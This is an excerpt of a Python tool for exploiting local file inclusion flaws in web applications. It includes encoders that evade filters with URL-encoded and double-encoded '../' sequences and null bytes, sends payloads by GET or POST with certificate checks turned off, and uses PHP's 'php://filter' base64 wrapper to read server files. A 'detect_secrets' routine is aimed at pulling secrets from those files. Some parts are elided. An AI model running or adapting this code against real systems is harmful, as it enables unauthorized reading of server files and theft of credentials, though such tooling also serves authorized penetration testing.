...
ENCODINGS = ["none", "url", "double", "traversal", "double_traversal", "nullbyte"]
...
def encode_traversal(payload):
    return payload.replace("../", "%2e%2e%2f")

def double_encode_traversal(payload):
    return payload.replace("../", "%252e%252e%252f")

def add_null_byte(payload):
    return payload + "%00"

def apply_encoding(payload, method):
    if method == "traversal":
        return encode_traversal(payload)
    
    elif method == "double_traversal":
        return double_encode_traversal(payload)
    
    elif method == "nullbyte":
        return add_null_byte(payload)
    
    else:
        return encode_payload(payload, method)
...
def exploit_lfi(url, param, lfi_payload, method="GET", proxies=None, encoding="none"):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    encoded_payload = apply_encoding(lfi_payload, encoding)

    if method.upper() == "POST":
        response = requests.post(
            url,
            data={param: encoded_payload},  # <-- THIS LINE
            verify=False,
            proxies=proxies
        )
        ...
        print(f"[DEBUG] Sending payload: {encoded_payload}")
...
def php_filter_base64(url, param, filename, method="GET", proxies=None, encoding="base64"):
    print("[*] Encoding php output in base64...")
    php_filter = "php://filter/convert.base64-encode/resource="
    filename = php_filter + filename

    response = exploit_lfi(url, param, filename, method, proxies, encoding)
    print("\n[DEBUG] FULL RESPONSE:\n")
    print(response.text)
...
def detect_secrets(url, param, filename, outfile, method="GET", proxies=None):
    ...
    decoded = php_filter_base64(url, param, filename, method, proxies, encoding="base64")
...
def main():
    ...
    parser.add_argument("--encode", help="Encoding method (none, url, double, base64)", default="none")
    ...
    if args.secrets:
        detect_secrets(args.url, args.param, args.lfi_payload, args.outfile, args.method, proxies)
